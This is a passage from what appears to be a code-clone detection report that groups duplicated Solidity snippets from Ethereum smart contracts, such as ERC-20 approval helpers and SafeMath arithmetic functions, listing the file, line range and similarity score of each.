    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x42e8ECeca237eA7FA8b4B52F14Ca6C3d3c3213dc.sol" startline="61" endline="64" pcid="2478">
    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x261771ae5888e4cc4f84eb74d9b2c931523272e9.sol" startline="610" endline="613" pcid="1212">
    function _approve(address owner, address spender, uint256 amount) internal {
        z[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x44b5f46a20c2981d1bae28c3549365b9c6186931.sol" startline="64" endline="67" pcid="2554">
    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0xc3577998420272f181f6eb96b319aa31894fd373.sol" startline="51" endline="54" pcid="6999">
    function _approve(address owner, address spender, uint256 amount) internal {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
<source file="systems/source-code/0x2dae79a98c60696b65d591700dfeb9422ab2735c.sol" startline="70" endline="73" pcid="1356">
    function _approve(address owner, address spender, uint256 amount) private {
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
</source>
</class>

<class classid="7" nclones="5" nlines="3" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="109" endline="111" pcid="9">
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="25" endline="27" pcid="8099">
    function _msgSender() internal view returns (address payable) {
        return msg.sender;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="111" endline="113" pcid="9237">
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="109" endline="111" pcid="9083">
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="113" endline="115" pcid="8492">
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
</source>
</class>

<class classid="8" nclones="12" nlines="4" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="113" endline="116" pcid="10">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="147" endline="150" pcid="7001">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="67" endline="70" pcid="4516">
    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="150" endline="153" pcid="7752">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="114" endline="117" pcid="7891">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="117" endline="120" pcid="8493">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="114" endline="117" pcid="6388">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="113" endline="116" pcid="9084">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="115" endline="118" pcid="9238">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="118" endline="121" pcid="3676">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="114" endline="117" pcid="5792">
  function _msgData() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="29" endline="32" pcid="8100">
    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
</source>
</class>

<class classid="9" nclones="41" nlines="5" similarity="75">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="142" endline="147" pcid="11">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x4537e1fb3777552b5e2475d45651702f3da39358.sol" startline="29" endline="33" pcid="2585">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="276" endline="281" pcid="1703">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x1804878a592887400697efb94134474a6bc6830f.sol" startline="37" endline="41" pcid="741">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x0f0138cbf893dd5926f5f4fd944e616d04617bc3.sol" startline="23" endline="27" pcid="387">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0xdd34428a0dd260cc83608d16abcd1f8baf0c097c.sol" startline="105" endline="110" pcid="7868">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x23e0b74aE3EC9f9B37AE2b13024Cc089e777E865.sol" startline="177" endline="181" pcid="1087">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x76d10a4438bdc79c3fe47dfa0b174ae5fd522db6.sol" startline="33" endline="37" pcid="4443">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="144" endline="149" pcid="9239">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="179" endline="184" pcid="7753">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="325" endline="330" pcid="7561">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="143" endline="148" pcid="5793">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="33" endline="37" pcid="3355">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="161" endline="166" pcid="4520">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="29" endline="34" pcid="1795">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="142" endline="147" pcid="9085">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xf53366b7eb8a67d2e1f41b0fc8619e082cd06666.sol" startline="126" endline="130" pcid="8982">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    return c;
  }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="325" endline="330" pcid="5303">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="31" endline="36" pcid="5887">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x8EB829589a20Aa412577544cD6e9732087B691AB.sol" startline="59" endline="64" pcid="5227">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="147" endline="152" pcid="3677">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xf4c78e50dbf4d7f864c659d1119c717926e9ff24.sol" startline="29" endline="33" pcid="8922">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0xa50904cb0ca5824ff012222a39420cb177d5b3ce.sol" startline="29" endline="33" pcid="5987">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
</source>
<source file="systems/source-code/0x89deb6c8918a42457bd6ddbcaaf979216c4d774c.sol" startline="27" endline="31" pcid="5118">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
</source>
<source file="systems/source-code/0xecdfc4259c9C74337768b0d804C442a67B36a761.sol" startline="158" endline="163" pcid="8630">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }
</source>
<source file="systems/source-code/0x1cFdab1D6685C85C299503BD1d3C6bab5e5933a1.sol" startline="28" endline="32" pcid="905">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0xeb6f0cfce80e88872c441d618e3c77c184892690.sol" startline="51" endline="56" pcid="8562">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);

    return c;
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="143" endline="148" pcid="7892">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="143" endline="148" pcid="6389">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="146" endline="151" pcid="8494">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="147" endline="151" pcid="4994">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x80c1735751ce113cceb3771d94f5a4afd3b0b1cc.sol" startline="147" endline="151" pcid="4819">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="141" endline="146" pcid="8101">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="127" endline="131" pcid="8067">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    return c;
  }
</source>
<source file="systems/source-code/0xcfcb73e6d920f1a1c22c9c7381499cdcabd0a69c.sol" startline="33" endline="37" pcid="7394">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="176" endline="181" pcid="7002">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="325" endline="330" pcid="7104">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xc601f3c40a8DE1f872AE056e7e21E255E740741A.sol" startline="147" endline="151" pcid="7126">
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);
    return c;
  }
</source>
<source file="systems/source-code/0x809d09a379bc553436aa267efa682093d226923d.sol" startline="29" endline="33" pcid="4753">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="105" endline="110" pcid="1972">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="325" endline="330" pcid="503">
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
</source>
</class>

<class classid="10" nclones="18" nlines="3" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="158" endline="160" pcid="12">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="159" endline="161" pcid="7893">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="177" endline="179" pcid="4521">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="162" endline="164" pcid="8495">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="160" endline="162" pcid="9240">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="159" endline="161" pcid="6390">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="163" endline="165" pcid="3678">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="195" endline="197" pcid="7754">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="332" endline="334" pcid="7105">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="292" endline="294" pcid="1704">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="158" endline="160" pcid="9086">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="332" endline="334" pcid="5304">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="47" endline="49" pcid="5888">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="332" endline="334" pcid="7562">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="159" endline="161" pcid="5794">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="332" endline="334" pcid="504">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="192" endline="194" pcid="7003">
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="157" endline="159" pcid="8102">
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
</source>
</class>

<class classid="11" nclones="19" nlines="5" similarity="100">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="171" endline="176" pcid="13">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0xaf404be4eecc70a69d2e0c77cd7bcb83f89b6b37.sol" startline="172" endline="177" pcid="6391">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0x790f5f96fc3ddc6df043cbbd70c99041c550b8b5.sol" startline="190" endline="199" pcid="4522">
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0x36Ce9629522814955bc7CE5eAC7313BDFB6AC136.sol" startline="71" endline="76" pcid="1798">
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xd2b03be6b1867d6de6b5119c7db25d2d32ec841b.sol" startline="336" endline="345" pcid="7563">
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xda4900629c8cd26434f99565a2e56e9ffa3fd187.sol" startline="208" endline="213" pcid="7755">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0xc586cc46ede422f8d841845f14d6c1bf0d166715.sol" startline="336" endline="345" pcid="7106">
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xa322440a7b1718a9f343c943ab140e8e62345769.sol" startline="63" endline="68" pcid="5889">
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xDD9A5E34e18efAbA1BB8F8f0FFf3EC70dC10622d.sol" startline="172" endline="177" pcid="7894">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="336" endline="345" pcid="505">
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xa0f68ff057c6c5c05d49697adaba44b224b5d284.sol" startline="172" endline="177" pcid="5795">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0xc3ba2cb0b121d567cf559855b7543fbd72ca173b.sol" startline="205" endline="210" pcid="7004">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="172" endline="177" pcid="8103">
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0x9120e2f26999bd0d31080a11905f20db46f45387.sol" startline="336" endline="345" pcid="5305">
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
<source file="systems/source-code/0xFd8a7A44c005013a2489f8253e44FD3BBCC2e02e.sol" startline="173" endline="178" pcid="9241">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0xea8724b6f006acc662c10c2471a95ba5d3dcdd8b.sol" startline="175" endline="180" pcid="8496">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="176" endline="181" pcid="3679">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0xf9e29e9c25b76744119a8f42478dc0d46e3aebfe.sol" startline="171" endline="176" pcid="9087">
  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }
</source>
<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="305" endline="310" pcid="1705">
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
</source>
</class>

<class classid="12" nclones="41" nlines="8" similarity="83">
<source file="systems/source-code/0x008593a82494094a6f95ceb1979bc6503229452c.sol" startline="187" endline="199" pcid="14">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x125e7f327020435cbb9d162e7df160349fe7bbf6.sol" startline="347" endline="359" pcid="506">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0xe075edd828ad35d7288e57d329fe84adf8763ba8.sol" startline="108" endline="115" pcid="8064">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b);
    return c;
  }
</source>
<source file="systems/source-code/0xE28c8C4FB5F5Fe07F53Eb527B60a217A75Cb00FC.sol" startline="188" endline="200" pcid="8104">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x6103653235228562deb4fafa7afc2af39ba93b75.sol" startline="192" endline="204" pcid="3680">
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }
</source>
<source file="systems/source-code/0x59951d9ca559862975e2f6c400f785029697ee05.sol" startline="12" endline="19" pcid="3352">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
<source file="systems/source-code/0x3Ad865f49cb532cE565677635F9ED7b3CbF27A5d.sol" startline="137" endline="149" pcid="1974">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
</source>
<source file="systems/source-code/0x8642Cc713b89201C001f578a1cBe5Aca584cCA0b.sol" startline="117" endline="124" pcid="4991">
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
</source>
